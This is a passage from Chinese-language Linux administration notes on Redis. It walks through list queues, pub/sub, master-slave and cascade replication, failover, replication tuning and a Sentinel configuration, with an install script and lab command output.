
![1657885454335](linux体系.assets/1657885454335.png)

![1657887890031](linux体系.assets/1657887890031.png)

![1658022959969](linux体系.assets/1658022959969.png)



**生产者发布消息**

```
[root@redis ~]# redis-cli
127.0.0.1:6379> AUTH 123456
OK
127.0.0.1:6379> LPUSH channel1 msg1 #从管道的左侧写入
(integer) 1
127.0.0.1:6379> LPUSH channel1 msg2
(integer) 2
127.0.0.1:6379> LPUSH channel1 msg3
(integer) 3
127.0.0.1:6379> LPUSH channel1 msg4
(integer) 4
127.0.0.1:6379> LPUSH channel1 msg5
(integer) 5
```

**查看队列所有消息**

```
127.0.0.1:6379> LRANGE channel1 0 -1
1) "msg5"
2) "msg4"
3) "msg3"
4) "msg2"
5) "msg1"
```

**消费者消费消息**

```
127.0.0.1:6379> RPOP channel1 #从管道的右侧消费，用于消息的先进先出
"msg1"
127.0.0.1:6379> RPOP channel1
"msg2"
127.0.0.1:6379> RPOP channel1
"msg3"
127.0.0.1:6379> RPOP channel1
"msg4"
127.0.0.1:6379> RPOP channel1
"msg5"
127.0.0.1:6379> RPOP channel1
(nil)
```

**再次验证队列消息**

```
127.0.0.1:6379> LRANGE channel1 0 -1
(empty list or set)  #队列中的消息已经被已全部消费完毕
```

##### 45.3.10.2 发布者订阅模式

```
在发布者订阅者模式下，发布者将消息发布到指定的channel里面，凡是监听该channel的消费者都会收到同样的一份消息，这种模式类似于是收音机的广播模式，即凡是收听某个频道的听众都会收到主持人发布的相同的消息内容。此模式常用语群聊天、群通知、群公告等场景
   Publisher：发布者
   Subscriber：订阅者
   Channel：频道
```

![1658023625956](linux体系.assets/1658023625956.png)

![1658023757168](linux体系.assets/1658023757168.png)

**订阅者监听频道**

```
[root@redis ~]# redis-cli
127.0.0.1:6379> AUTH 123456
OK
127.0.0.1:6379> SUBSCRIBE channel1 #订阅者事先订阅指定的频道，之后发布的消息才能收到
Reading messages... (press Ctrl-C to quit)
1) "subscribe"
2) "channel1"
3) (integer) 1
```

**发布者发布消息**

```
127.0.0.1:6379> PUBLISH channel1 test1 #发布者发布消息
(integer) 2   #订阅者个数
127.0.0.1:6379> PUBLISH channel1 test2
(integer) 2
```

**各个订阅者都能收到消息**

![1658025556513](linux体系.assets/1658025556513.png)

**订阅多个频道**

```
#订阅指定的多个频道
127.0.0.1:6379> SUBSCRIBE channel1 channel2
```

**订阅所有频道**

```
127.0.0.1:6379> PSUBSCRIBE *  #支持通配符*
```

**订阅匹配的频道**

```
127.0.0.1:6379> PSUBSCRIBE chann*  #匹配订阅多个频道
```

**取消订阅**

```
127.0.0.1:6379> unsubscribe channel1
1) "unsubscribe"
2) "channel1"
3) (integer) 0
```

### 45.4 redis集群与高可用

```
虽然Redis可以实现单机的数据持久化，但无论是RDB也好或者AOF也好，都解决不了单点宕机问题，即一旦单台redis服务器本身出现系统故障、硬件故障等问题后，就会直接造成数据的丢失此外,单机的性能也是有极限的,因此需要使用另外的技术来解决单点故障和性能扩展的问题。
```

#### 45.4.1 redis主从复制介绍

![1658026354614](linux体系.assets/1658026354614.png)

**redis主从复制架构**

```
主从模式（master/slave），可以实现Redis数据的跨主机备份。

程序端连接到高可用负载的VIP，然后连接到负载服务器设置的Redis后端real server，此模式不需要在程序里面配 置Redis服务器的真实IP地址，当后期Redis服务器IP地址发生变更只需要更改redis 相应的后端real server即可，可避免更改程序中的IP地址设置。
```

![1658026597471](linux体系.assets/1658026597471.png)

**主从复制特点**

```
一个master可以有多个slave
一个slave只能有一个master
数据流向是单向的，master到slave
```

#### 45.4.2 主从复制实现

```
Redis Slave 也要开启持久化并设置和master同样的连接密码，因为后期slave会有提升为master的可能,Slave 端切换master同步后会丢失之前的所有数据,而通过持久化可以恢复数据。

一旦某个Slave成为一个master的slave，Redis Slave服务会清空当前redis服务器上的所有数据并将master的数据导入到自己的内存，但是如果只是断开同步关系后,则不会删除当前已经同步过的数据。
```

![is1658026782975](linux体系.assets/1658026782975.png)

**环境准备**

| 10.0.0.17 | redis-master |
| --------- | ------------ |
| 10.0.0.27 | redis-slave1 |
| 10.0.0.37 | redis-slave2 |
| 10.0.0.7  | 跑pyhton脚本 |

**10.0.0.17**

```
#先在机器上跑我的一键编译安装redis脚本
#!/bin/bash
#      
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-10
#FileName：     install_redis.sh
#Description：  通用脚本：在线一键编译安装Redis
#********************************************************************
SRC_DIR=/usr/local/src
COLOR="echo -e \\033[01;31m"
END='\033[0m'
CPUS=`lscpu |awk '/^CPU\(s\)/{print $2}'`

URL='https://download.redis.io/releases/'
REDIS_FILE=redis-6.2.2.tar.gz
VERSION=`echo $REDIS_FILE |awk -F"[-.]" '{print $2}'`
PASSWORD=123456
INSTALL_DIR=/apps/redis

rpm -q wget &> /dev/null || yum -y install wget
os(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release;then
        rpm -q redhat-lsb-core &> /dev/null || { ${COLOR}"安装lsb_release工具"${END};yum -y install  redhat-lsb-core &> /dev/null; }
    fi
    OS_ID=`lsb_release -is`
}

check_file (){
    cd ${SRC_DIR}
    rpm -q wget &> /dev/null || yum -y install wget &> /dev/null
    if [ ! -e ${REDIS_FILE} ];then
        ${COLOR}"缺少${REDIS_FILE}文件"${END}
        ${COLOR}'开始下载REDIS源码包'${END}
        wget ${URL}${REDIS_FILE} || { ${COLOR}"Redis 源码下载失败"${END}; exit; } 
    else
        ${COLOR}"相关文件已准备好"${END}
    fi
}

install(){
    [ -d ${INSTALL_DIR} ] && { ${COLOR}"Redis已存在，安装失败"${END};exit; }
    ${COLOR}"开始安装REDIS"${END}
    ${COLOR}"开始安装REDIS依赖包"${END}
    if [ ${VERSION} == "6" ] ;then
        if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel systemd-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev libsystemd-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    else
         if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
            yum  -y install gcc jemalloc-devel &> /dev/null || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        else
            apt -y install make gcc libjemalloc-dev &> /dev/null  || { ${COLOR}"安装软件包失败，请检查网络配置"${END}; exit; }
        fi
    fi
    cd ${SRC_DIR}
    tar xf ${REDIS_FILE}
    REDIS_DIR=`echo ${REDIS_FILE} | sed -nr 's/^(.*[0-9]).*/\1/p'`
    cd ${REDIS_DIR}
    if [ ${VERSION} == "6" ] ;then
        make -j ${CPUS} USE_SYSTEMD=yes PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    else
        make -j ${CPUS} PREFIX=${INSTALL_DIR} install && ${COLOR}"Redis 编译安装完成"${END} || { ${COLOR}"Redis 编译安装失败"${END};exit ; }
    fi
    ln -s ${INSTALL_DIR}/bin/redis-*  /usr/bin/
    mkdir -p ${INSTALL_DIR}/{etc,log,data,run}
    cp redis.conf  ${INSTALL_DIR}/etc/
    sed -i -e 's/bind 127.0.0.1.*/bind 0.0.0.0/'  -e "/# requirepass/a requirepass ${PASSWORD}"  -e "/^dir .*/c dir ${INSTALL_DIR}/data/"  -e "/logfile .*/c logfile ${INSTALL_DIR}/log/redis-6379.log"  -e  "/^pidfile .*/c  pidfile ${INSTALL_DIR}/run/redis_6379.pid" ${INSTALL_DIR}/etc/redis.conf

    if id redis &> /dev/null ;then
        ${COLOR}"Redis 用户已存在"${END}
    else
        useradd -r -s /sbin/nologin redis
        ${COLOR}"Redis 用户创建成功"${END}
    fi

    chown -R redis.redis ${INSTALL_DIR}
    cat >> /etc/sysctl.conf <<-EOF
net.core.somaxconn = 1024
vm.overcommit_memory = 1
EOF
    sysctl -p
    if [ ${OS_ID} == "CentOS" ] &> /dev/null;then
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
    else
        cat >> /lib/systemd/system/rc-local.service <<-EOF

[Install]
WantedBy=multi-user.target
EOF
        echo '#!/bin/bash' > /etc/rc.local
        echo 'echo never > /sys/kernel/mm/transparent_hugepage/enabled' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    cat > /lib/systemd/system/redis.service <<-EOF
[Unit]
Description=Redis persistent key-value database
After=network.target

[Service]
ExecStart=${INSTALL_DIR}/bin/redis-server ${INSTALL_DIR}/etc/redis.conf --supervised systemd
ExecReload=/bin/kill -s HUP \$MAINPID
ExecStop=/bin/kill -s QUIT \$MAINPID
Type=notify
User=redis
Group=redis
RuntimeDirectory=redis
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable --now  redis &> /dev/null 
    systemctl is-active redis &> /dev/null && ${COLOR}"Redis 服务启动成功,Redis信息如下:"${END} || { ${COLOR}"Redis 启动失败"${END};exit; }
    redis-cli -a ${PASSWORD} info server 2> /dev/null
    ${COLOR}"亲亲~Redis安装完成"${END}
}

main(){
    os
    check_file
    install
}

main




#查看从节点个数
127.0.0.1:6379> info replication
# Replication
role:master
connected_slaves:2   #2个从节点
slave0:ip=10.0.0.37,port=6379,state=online,offset=1526,lag=1
slave1:ip=10.0.0.27,port=6379,state=online,offset=1526,lag=0
master_failover_state:no-failover
master_replid:cbfa63fefb2300213c6fd2a654ae9cddd9bd94c7
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:1526
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:1526
```

**10.0.0.27**

```
#先在机器上跑我的一键编译安装redis脚本
[root@redis-slave1 ~]# redis-cli -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> info replication   #刚开是都是master节点
# Replication
role:master
connected_slaves:0
master_failover_state:no-failover
master_replid:7cd399e043ad51dc40ac3606adae74393c8c2995
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0


127.0.0.1:6379> replicaof 10.0.0.17 6379   #配置从结点
OK

127.0.0.1:6379> info replication
# Replication
role:slave
master_host:10.0.0.17
master_port:6379
master_link_status:down   #没设置密码，状态为down
master_last_io_seconds_ago:-1
master_sync_in_progress:0
slave_repl_offset:1
master_link_down_since_seconds:-1
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:7cd399e043ad51dc40ac3606adae74393c8c2995
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
127.0.0.1:6379> keys *
(empty array)


127.0.0.1:6379> config set masterauth 123456  #设置密码,注意此为临时修改，不是永久保存！！
OK


127.0.0.1:6379> info replication
# Replication
role:slave
master_host:10.0.0.17
master_port:6379
master_link_status:up  #状态变为up
master_last_io_seconds_ago:8
master_sync_in_progress:0
slave_repl_offset:14
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:cbfa63fefb2300213c6fd2a654ae9cddd9bd94c7
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:14
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:14


127.0.0.1:6379> keys *   #查看数据是否同步
.....
 99985) "k55838"
 99986) "k64160"
 99987) "k83991"
 99988) "k36783"
 99989) "k50853"
 99990) "k77953"
 99991) "k91951"
 99992) "k48770"
 99993) "k68586"
 99994) "k72285"
 99995) "k64264"
 99996) "k69209"
 99997) "k92653"
 99998) "k72240"
 99999) "k64271"
100000) "k59428"
100001) "k2904"
100002) "k75186"
100003) "k86762"




#持久化保存
[root@redis-slave1 ~]# vim /apps/redis/etc/redis.conf
#在477行修改
replicaof 10.0.0.17 6379
#在484行修改
masterauth 123456
[root@redis-slave1 ~]# systemctl restart redis



#删除主从同步
#取消复制,在slave上执行REPLIATOF NO ONE,会断开和master的连接不再主从复制, 但不会清除slave上已有的数据
127.0.0.1:6379> REPLICAOF no one
```

**10.0.0.37**

```
#先在机器上跑我的一键编译安装redis脚本
#先在机器上跑我的一键编译安装redis脚本
[root@redis-slave2 ~]# redis-cli -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> info replication   #刚开是都是master节点
# Replication
role:master
connected_slaves:0
master_failover_state:no-failover
master_replid:7cd399e043ad51dc40ac3606adae74393c8c2995
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0


127.0.0.1:6379> replicaof 10.0.0.17 6379   #配置从结点
OK

127.0.0.1:6379> info replication
# Replication
role:slave
master_host:10.0.0.17
master_port:6379
master_link_status:down   #没设置密码，状态为down
master_last_io_seconds_ago:-1
master_sync_in_progress:0
slave_repl_offset:1
master_link_down_since_seconds:-1
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:7cd399e043ad51dc40ac3606adae74393c8c2995
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
127.0.0.1:6379> keys *
(empty array)


127.0.0.1:6379> config set masterauth 123456  #设置密码,注意此为临时修改，不是永久保存！！
OK


127.0.0.1:6379> info replication
# Replication
role:slave
master_host:10.0.0.17
master_port:6379
master_link_status:up  #状态变为up
master_last_io_seconds_ago:8
master_sync_in_progress:0
slave_repl_offset:14
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:cbfa63fefb2300213c6fd2a654ae9cddd9bd94c7
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:14
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:14



127.0.0.1:6379> keys *   #查看数据是否同步
.....
 99985) "k55838"
 99986) "k64160"
 99987) "k83991"
 99988) "k36783"
 99989) "k50853"
 99990) "k77953"
 99991) "k91951"
 99992) "k48770"
 99993) "k68586"
 99994) "k72285"
 99995) "k64264"
 99996) "k69209"
 99997) "k92653"
 99998) "k72240"
 99999) "k64271"
100000) "k59428"
100001) "k2904"
100002) "k75186"
100003) "k86762"



#持久化保存
[root@redis-slave2 ~]# vim /apps/redis/etc/redis.conf
#在477行修改
replicaof 10.0.0.17 6379
#在484行修改
masterauth 123456
[root@redis-slave2 ~]# systemctl restart redis



#删除主从同步
#取消复制,在slave上执行REPLIATOF NO ONE,会断开和master的连接不再主从复制, 但不会清除slave上已有的数据
127.0.0.1:6379> REPLICAOF no one
```

**10.0.0.7**

```
#1.编写pyhton测试脚本
#向master节点写10万条数据
[12:06:27 root@centos7 ~]# yum -y install python3 python3-redis
[12:20:32 root@centos7 ~]#cat redis_test.py 
#!/bin/env python3 
import redis
pool = redis.ConnectionPool(host="10.0.0.17",port=6379,password="123456",decode_responses=True)
r = redis.Redis(connection_pool=pool)
for i in range(100000):
    r.set("k%d" % i,"v%d" % i)
    data=r.get("k%d" % i)
    print(data)
    
[12:06:27 root@centos7 ~]# chmod +x redis_test.py
[12:06:27 root@centos7 ~]# ./redis_test.py
```

#### 45.4.3 主从复制故障恢复

##### 45.4.3.1 slave节点故障和恢复

Client指向另一个从节点即可,并及时修复故障从节点

![1658034751944](linux体系.assets/1658034751944.png)

##### 45.4.3.2 master节点故障和恢复

master故障后，只能手动提升一个slave为新master，不支持自动切换。Master的切换会导致master_replid发生变化，slave之前的master_replid就和当前master不一致从而会引发所有 slave的全量同步。

![1658049963938](linux体系.assets/1658049963938.png)

**10.0.0.17**

```
#10.0.0.17上挂掉主节点
[root@redis-master ~]# systemctl stop redis
```

**10.0.0.27**

```
#1.主节点挂掉后查看从节点状态
127.0.0.1:6379> info replication
# Replication
role:slave
master_host:10.0.0.17
master_port:6379 
master_link_status:down   #down状态
master_last_io_seconds_ago:-1
master_sync_in_progress:0
slave_repl_offset:252
master_link_down_since_seconds:51
slave_priority:100
slave_read_only:1
replica_announced:1
connected_slaves:0
master_failover_state:no-failover
master_replid:4dba26e53e46bd5186a849bf0e7c3e0da0b6bb71
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:252
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:252




#2.停止slave同步并提升为新的master
127.0.0.1:6379> REPLICAOF NO ONE
OK
#新主上写入数据
127.0.0.1:6379> set date 20220717
OK
```

**10.0.0.37**

```
#1.设置新的主从节点
127.0.0.1:6379> REPLICAOF 10.0.0.27 6379
OK
127.0.0.1:6379> get date
"20220717"   #数据同步成功
```

#### 45.4.4 实现redis级联复制

![1658051240447](linux体系.assets/1658051240447.png)

**环境准备**

| 10.0.0.17 | redis-master   |
| --------- | -------------- |
| 10.0.0.27 | redis-级联节点 |
| 10.0.0.37 | redis-slave2   |
| 10.0.0.7  | 跑pyhton脚本   |

**10.0.0.17**

```
#设置数据，检验是否实现级联复制
[root@redis-master ~]# redis-cli -a 123456
127.0.0.1:6379> set name liusenbiao
OK
```

**10.0.0.27**

```
#指向10.0.0.17节点
127.0.0.1:6379> REPLICAOF 10.0.0.17 6379
OK
```

**10.0.0.37**

```
#指向10.0.0.27节点，实现级联复制
127.0.0.1:6379> REPLICAOF 10.0.0.27 6379
OK
127.0.0.1:6379> get name
"liusenbiao"   #级联复制成功！！
```

#### 45.4.5 主从复制优化

**Redis主从复制分为全量同步和增量同步**

##### 45.4.5.1 全量复制过程

![1658051970019](linux体系.assets/1658051970019.png)

```
首次同步是全量同步，主从同步可以让从服务器从主服务器同步数据，而且从服务器还可再有其它的从服务器，即另外一台redis服务器可以从一台从服务器进行数据同步，redis 的主从同步是非阻塞的，master收到从服务器psync(2.8版本之前是SYNC)命令,会fork一个子进程在后台执行bgsave命令，并将新写入的数据写入到一个缓冲区中，bgsave执行完成之后,将生成的RDB文件发送给slave，然后master再将缓冲区的内容以redis协议格式再全部发送给slaveslave 先删除旧数据,slave将收到后的RDB文件载入自己的内存，再加载所有收到缓冲区的内容 从而这样一次完整的数据步。

Redis全量复制一般发生在Slave首次初始化阶段，这时Slave需要将Master上的所有数据都复制一份。
```

##### 45.4.5.2 增量复制过程

![1658052244346](linux体系.assets/1658052244346.png)

```
全量同步之后再次需要同步时,从服务器只要发送当前的offset位置(等同于MySQL的binlog的位置)给主服务器，然后主服务器根据相应的位置将之后的数据(包括写在缓冲区的积压数据)发送给从服务器,再次其保存到其内存即可。
```

##### 45.4.5.3 主从同步完整过程

```
1）从服务器连接主服务器，发送PSYNC命令
2）主服务器接收到PSYNC命令后，开始执行BGSAVE命令生成RDB快照文件并使用缓冲区记录此后执行的所有写命令
3）主服务器BGSAVE执行完后，向所有从服务器发送RDB快照文件，并在发送期间继续记录被执行的写命令
4）从服务器收到快照文件后丢弃所有旧数据，载入收到的快照至内存
5）主服务器快照发送完毕后,开始向从服务器发送缓冲区中的写命令
6）从服务器完成对快照的载入，开始接收命令请求，并执行来自主服务器缓冲区的写命令
7）后期同步会先发送自己slave_repl_offset位置，只同步新增加的数据，不再全量同步
```

![1658052468420](linux体系.assets/1658052468420.png)

![1658052702579](linux体系.assets/1658052702579.png)

**复制缓冲区(环形队列)配置参数**

```
#复制缓冲区大小,建议要设置足够大
repl-backlog-size 1mb 

#Redis同时也提供了当没有slave需要同步的时候，多久可以释放环形队列：
repl-backlog-ttl   3600
```

##### 45.4.5.4 避免全量复制

```
1）第一次全量复制不可避免,后续的全量复制可以利用小主节点(内存小),业务低峰时进行全量
2）节点运行ID不匹配:主节点重启会导致RUNID变化,可能会触发全量复制,可以利用故障转移，例如哨兵或集群,而从节点重启动,不会导致全量复制
3）复制积压缓冲区不足: 当主节点生成的新数据大于缓冲区大小,从节点恢复和主节点连接后,会导致全量复制.解决方法将repl-backlog-size调大
```

##### 45.4.5.5 避免复制风暴

```
单主节点复制风暴
当主节点重启，多从节点复制
解决方法:更换复制拓扑
```

![1658053131044](linux体系.assets/1658053131044.png)

```
单机器复制风暴
机器宕机后，大量全量复制
解决方法:主节点分散多机器
```

![1658053235583](linux体系.assets/1658053235583.png)

##### 45.4.5.6 主从同步优化配置

**性能相关配置**

```
repl-diskless-sync no # 是否使用无盘同步RDB文件，默认为no，no为不使用无盘，需要将RDB文件保存到磁盘后再发送给slave，yes为支持无盘，支持无盘就是RDB文件不需要保存至本地磁盘，而且直接通  过socket文件发送slave

repl-diskless-sync-delay 5 #diskless时复制的服务器等待的延迟时间

repl-ping-slave-period 10 #slave端向server端发送ping的时间间隔，默认为10秒

repl-timeout 60 #设置主从ping连接超时时间,超过此值无法连接,master_link_status显示为down,并记录错误日志

repl-disable-tcp-nodelay no #是否启用TCP_NODELAY，如设置成yes，则redis会合并小的TCP包从而节省带宽， 但会增加同步延迟（40ms），造成master与slave数据不一致，假如设置成no，则redis master会立即发送同步数据，没有延迟，yes关注性能，no关注redis服务中的数据一致性

repl-backlog-size 1mb #master的写入数据缓冲区，用于记录自上一次同步后到下一次同步过程中间的写入命令，计算公式：repl-backlog-size = 允许从节点最大中断时长 * 主实例offset每秒写入 量，比如master每秒最大写入64mb，最大允许60秒，那么就要设置为64mb*60秒=3840MB(3.8G),建议此  值是设置的足够大

repl-backlog-ttl 3600 #如果一段时间后没有slave连接到master，则backlog size的内存将会被释放。如果值为0则 表示永远不释放这部份内存。

slave-priority 100 #slave端的优先级设置，值是一个整数，数字越小表示优先级越高。当master故障时将会按照优先级来选择slave端进行恢复，如果值设置为0，则表示该slave永远不会被选择。

min-replicas-to-write 1 #设置一个master的可用slave不能少于多少个，否则master无法执行写

min-slaves-max-lag 20 #设置至少有上面数量的slave延迟时间都大于多少秒时，master不接收写操作(拒绝写入)
```

#### 45.4.6 Redis哨兵

##### 45.4.6.1 哨兵工作原理

**sentinel 架构和故障转移**

![1658110165368](linux体系.assets/1658110165368.png)

**sentinel架构**

![1658110405904](linux体系.assets/1658110405904.png)

**sentinel故障转移**

![1658110313418](linux体系.assets/1658110313418.png)

```
Sentinel 进程是用于监控redis集群中Master主服务器工作的状态，在Master主服务器发生故障的时候，可以实现Master和Slave服务器的切换，保证系统的高可用，此功能在redis2.6+的版本已引用，Redis的哨兵模式到了2.8版本之后就稳定了下来。一般在生产环境也建议使用Redis的2.8版本的以后版本。


哨兵(Sentinel) 是一个分布式系统，可以在一个架构中运行多个哨兵(sentinel)进程，这些进程使用流言协议(gossip protocols)来接收关于Master主服务器是否下线的信息，并使用投票协议(Agreement Protocols)来决定是否执行自动故障迁移,以及选择哪个Slave作为新的Master。


每个哨兵(Sentinel)进程会向其它哨兵(Sentinel)、Master、Slave定时发送消息，以确认对方是否”活”着，如果发现对方在指定配置时间(此项可配置)内未得到回应，则暂时认为对方已离线，也就是所谓的”主观认为宕机” (主观:是每个成员都具有的独自的而且可能相同也可能不同的意识)，英文名称：Subjective Down，简称SDOWN。

有主观宕机，对应的有客观宕机。当“哨兵群”中的多数Sentinel进程在对Master主服务器做出SDOWN 的判断，并且通过 SENTINEL is-master-down-by-addr 命令互相交流之后，得出的Master Server下线判断，这种方式就是“客观宕机”(客观:是不依赖于某种意识而已经实际存在的一切事物)，英文名称是：Objectively Down，简称ODOWN。


通过一定的vote算法，从剩下的slave从服务器节点中，选一台提升为Master服务器节点，然后自动修改相关配置，并开启故障转移（failover）。

Sentinel 机制可以解决master和slave角色的自动切换问题，但单个 Master 的性能瓶颈问题无法解决,类似于MySQL中的MHA功能。

Redis Sentinel中的Sentinel节点个数应该为大于等于3且最好为奇数。

客户端初始化时连接的是Sentinel节点集合，不再是具体的Redis节点，但Sentinel只是配置中心不是代理。

Redis Sentinel 节点与普通redis 没有区别,要实现读写分离依赖于客户端程序。

redis 3.0 之前版本中,生产环境一般使用哨兵模式,但3.0后推出redis cluster功能后,可以支持更大规模的生产环境。
```

**sentinel中的三个定时任务**

```
1）每10秒每个sentinel对master和slave执行info
2）发现slave节点
3）确认主从关系
4）每2秒每个sentinel通过master节点的channel交换信息(pub/sub)
5）通过sentinel__:hello频道交互
6）交互对节点的“看法”和自身信息
7）每1秒每个sentinel对其他sentinel和redis执行ping
```

##### 45.4.6.2 实现哨兵

![1658111411601](linux体系.assets/1658111411601.png)

**所有主从节点的redis.conf中关健配置**

```
#在所有主从节点执行
#编译安装redis
[root@centos8 ~]# vim /apps/redis/etc/redis.conf
bind 0.0.0.0
masterauth 123456
requirepass 123456

#或者非交互执行
[root@centos8 ~]#sed -i -e 's/bind 127.0.0.1/bind 0.0.0.0/' -e 's/^# masterauth .*/masterauth 123456/' -e 's/^# requirepass .*/requirepass 123456/' /apps/redis/etc/redis.conf

#在所有从节点执行
[root@centos8 ~]#echo "replicaof 10.0.0.17 6379" >> /apps/redis/etc/redis.conf

#在所有主从节点执行
[root@centos8 ~]# systemctl restart redis
```

**编辑哨兵的配置文件**

```
[root@redis-master redis-6.2.2]# cp /usr/local/src/redis-6.2.2/sentinel.conf /apps/redis/etc/
[root@redis-master ~]# cat /apps/redis/etc/redis-sentinel.conf
# Example sentinel.conf

# *** IMPORTANT ***
#
# By default Sentinel will not be reachable from interfaces different than
# localhost, either use the 'bind' directive to bind to a list of network
# interfaces, or disable protected mode with "protected-mode no" by
# adding it to this configuration file.
#
# Before doing that MAKE SURE the instance is protected from the outside
# world via firewalling or other means.
#
# For example you may use one of the following:
#
# bind 127.0.0.1 192.168.1.1
#
# protected-mode no
bind 0.0.0.0
# port <sentinel-port>
# The port that this sentinel instance will run on
port 26379

# By default Redis Sentinel does not run as a daemon. Use 'yes' if you need it.
# Note that Redis will write a pid file in /var/run/redis-sentinel.pid when
# daemonized.
daemonize yes

# When running daemonized, Redis Sentinel writes a pid file in
# /var/run/redis-sentinel.pid by default. You can specify a custom pid file
# location here.
pidfile /apps/redis/run/redis-sentinel.pid

# Specify the log file name. Also the empty string can be used to force
# Sentinel to log on the standard output. Note that if you use standard
# output for logging but daemonize, logs will be sent to /dev/null
logfile "/apps/redis/log/sentinel_26379.log"

# sentinel announce-ip <ip>
# sentinel announce-port <port>
#
# The above two configuration directives are useful in environments where,
# because of NAT, Sentinel is reachable from outside via a non-local address.
#
# When announce-ip is provided, the Sentinel will claim the specified IP address
# in HELLO messages used to gossip its presence, instead of auto-detecting the
# local address as it usually does.
#
# Similarly when announce-port is provided and is valid and non-zero, Sentinel
# will announce the specified TCP port.
#
# The two options don't need to be used together, if only announce-ip is
# provided, the Sentinel will announce the specified IP and the server port
# as specified by the "port" option. If only announce-port is provided, the
# Sentinel will announce the auto-detected local IP and the specified port.
#
# Example:
#
# sentinel announce-ip 1.2.3.4

# dir <working-directory>
# Every long running process should have a well-defined working directory.
# For Redis Sentinel to chdir to /tmp at startup is the simplest thing
# for the process to don't interfere with administrative tasks such as
# unmounting filesystems.
dir /tmp

# sentinel monitor <master-name> <ip> <redis-port> <quorum>
#
# Tells Sentinel to monitor this master, and to consider it in O_DOWN
# (Objectively Down) state only if at least <quorum> sentinels agree.
#
# Note that whatever is the ODOWN quorum, a Sentinel will require to
# be elected by the majority of the known Sentinels in order to
# start a failover, so no failover can be performed in minority.
#
# Replicas are auto-discovered, so you don't need to specify replicas in
# any way. Sentinel itself will rewrite this configuration file adding
# the replicas using additional configuration options.
# Also note that the configuration file is rewritten when a
# replica is promoted to master.
#
# Note: master name should not include special characters or spaces.
# The valid charset is A-z 0-9 and the three characters ".-_".
sentinel monitor mymaster 10.0.0.17 6379 2
sentinel auth-pass mymaster 123456

# sentinel auth-pass <master-name> <password>
#
# Set the password to use to authenticate with the master and replicas.
# Useful if there is a password set in the Redis instances to monitor.
#
# Note that the master password is also used for replicas, so it is not
# possible to set a different password in masters and replicas instances
# if you want to be able to monitor these instances with Sentinel.
#
# However you can have Redis instances without the authentication enabled
# mixed with Redis instances requiring the authentication (as long as the
# password set is the same for all the instances requiring the password) as
# the AUTH command will have no effect in Redis instances with authentication
# switched off.
#
# Example:
#
# sentinel auth-pass mymaster MySUPER--secret-0123passw0rd

# sentinel auth-user <master-name> <username>
#
# This is useful in order to authenticate to instances having ACL capabilities,
# that is, running Redis 6.0 or greater. When just auth-pass is provided the
# Sentinel instance will authenticate to Redis using the old "AUTH <pass>"
# method. When also an username is provided, it will use "AUTH <user> <pass>".
# In the Redis servers side, the ACL to provide just minimal access to
# Sentinel instances, should be configured along the following lines:
#
#     user sentinel-user >somepassword +client +subscribe +publish \
#                        +ping +info +multi +slaveof +config +client +exec on

# sentinel down-after-milliseconds <master-name> <milliseconds>
#
# Number of milliseconds the master (or any attached replica or sentinel) should
# be unreachable (as in, not acceptable reply to PING, continuously, for the
# specified period) in order to consider it in S_DOWN state (Subjectively
# Down).
#
# Default is 30 seconds.
sentinel down-after-milliseconds mymaster 1000

# IMPORTANT NOTE: starting with Redis 6.2 ACL capability is supported for
# Sentinel mode, please refer to the Redis website https://redis.io/topics/acl
# for more details.

# Sentinel's ACL users are defined in the following format:
#
#   user <username> ... acl rules ...
#
# For example:
#
#   user worker +@admin +@connection ~* on >ffa9203c493aa99
#
# For more information about ACL configuration please refer to the Redis
# website at https://redis.io/topics/acl and redis server configuration 
# template redis.conf.

# ACL LOG
#
# The ACL Log tracks failed commands and authentication events associated
